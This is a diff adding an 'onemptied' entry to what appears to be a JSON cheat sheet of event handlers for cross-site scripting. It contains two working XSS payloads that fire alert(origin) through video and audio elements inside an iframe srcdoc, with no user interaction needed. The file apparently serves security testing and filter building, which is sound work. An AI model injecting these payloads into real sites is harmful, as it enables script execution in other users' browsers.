@@ -6375,5 +6375,22 @@
         "interaction": false
       }
     ]
+  },
+  "onemptied": {
+    "description": "Fires when the src attribute of a media element (like <audio> or <video>) changes to an empty string.",
+    "tags": [
+      {
+        "tag": "video",
+        "code": "<iframe srcdoc=\"<video onemptied='alert(origin);' id='videoPlayer' controls><source src='.' type='video/mp4'></video><script>document.getElementById('videoPlayer').src = '';</script>\"> </iframe>",
+        "browsers": ["chrome", "firefox", "safari"],
+        "interaction": false
+      },
+      {
+        "tag": "audio",
+        "code": "<iframe srcdoc=\"<audio onemptied='alert(origin);' id='audioPlayer' controls><source src='.' type='audio/mp3'></audio><script>document.getElementById('audioPlayer').src = '';</script>\"> </iframe>",
+        "browsers": ["chrome", "firefox", "safari"],
+        "interaction": false
+      }
+    ]
   }
 }
